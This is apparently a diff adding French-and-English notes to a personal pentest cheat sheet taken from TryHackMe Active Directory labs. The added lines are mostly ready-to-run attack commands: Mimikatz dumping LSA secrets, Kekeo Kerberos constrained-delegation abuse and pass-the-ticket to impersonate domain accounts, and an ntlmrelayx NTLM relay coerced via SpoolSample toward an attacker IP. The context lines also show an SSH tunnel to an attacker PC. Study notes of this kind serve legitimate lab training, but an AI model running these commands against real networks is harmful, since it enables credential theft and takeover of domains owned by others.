@@ -546,6 +546,41 @@
           This will establish an SSH session from PC-1 to 1.1.1.1 (Attacker PC) using the tunneluser user.
           Puis sur la kali : munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
 
+    MIMIKATZ / KEKEO DELEGATION KERBEROS
+        Ouvrir mimikatz en powershell admin
+        token::elevate (To dump the secrets from the registry hive, we need to impersonate the SYSTEM user)
+        lsadump::secrets (Mimikatz interacts with the registry hive to pull the clear text credentials.)
+
+        Ouvrir Kekeo en powershell admin
+        tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:redacted
+            user - The user who has the constrained delegation permissions.
+            domain - The domain that we are attacking since Kekeo can be used to forge tickets to abuse cross-forest trust.
+            password - The password associated with the svcIIS account.
+        tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
+            tgt - We provide the TGT that we generated in the previous step.
+            user - The user we want to impersonate. Since t2_ accounts have administrative access over workstations, it is a safe assumption that t1_ accounts will have administrative access over servers, so choose a t1_ account that you would like to impersonate.
+            service - The services we want to impersonate using delegation. We first generate a TGS for the HTTP service. Then we can rerun the same command for the WSMAN service.
+            
+        reouvrir mimikatz:          
+        privilege::debug
+        kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi  (import du ticket wsman)
+        kerberos::ptt TGS_t2_melanie.davies@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi (import du ticket http)
+
+        quitter mimikatz
+        klist pour voir les tickets
+        New-PSSession -ComputerName thmserver1.za.tryhackme.loc pour créer une session powershell
+
+    Exploiting Automated Relays
+        MACHINE ACCOUNTS DANS BLOODHOUND:
+          MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
+        Print Spooler Service
+          PS C:\> GWMI Win32_Printer -Computer thmserver2.za.tryhackme.loc
+        SMB Signing
+          nmap --script=smb2-security-mode -p445 thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc (We can see that SMB signing is enabled but not enforced based on the output. This means all our conditions are met, and we can start the attack!).
+        SET UP NTLM RELAY
+          python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -debug
+          SpoolSample.exe THMSERVER2.za.tryhackme.loc "Attacker IP"
+          
 #[BUFFER OVERFLOW]
 
     https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
